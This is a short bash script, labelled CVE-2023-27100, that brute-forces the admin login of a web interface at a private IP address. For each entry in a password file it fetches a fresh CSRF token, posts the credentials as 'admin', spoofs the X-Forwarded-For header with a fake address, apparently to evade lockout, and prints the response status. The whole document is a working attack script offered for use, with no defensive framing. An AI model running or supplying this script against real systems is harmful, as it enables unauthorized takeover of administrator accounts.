#!/bin/bash

# CVE-2023-27100

url="https://192.168.110.100"

readarray -t passwords < passwords.txt

for password in ${passwords[@]}; do
    get_response=$(curl -k -s "$url")
    csrf_token=$( echo "$get_response" | grep -P "input type='hidden' name='__csrf_magic'" \
        | cut -d '"' -f 6)
    post_data="__csrf_magic=${csrf_token}&usernamefld=admin&passwordfld=${password}&login=Sign+In"
    post_response=$(curl -X POST -d "$post_data" -H "User-Agent: Mozilla/5.0"\
        -H "Referer: $url" -H "X-Forwarded-For: 42.42.42.42" "$url" -i -k -s)
    return_code=$(echo "$post_response" | head -n 1) 
    echo "$password - $return_code"
    sleep 0.2
done
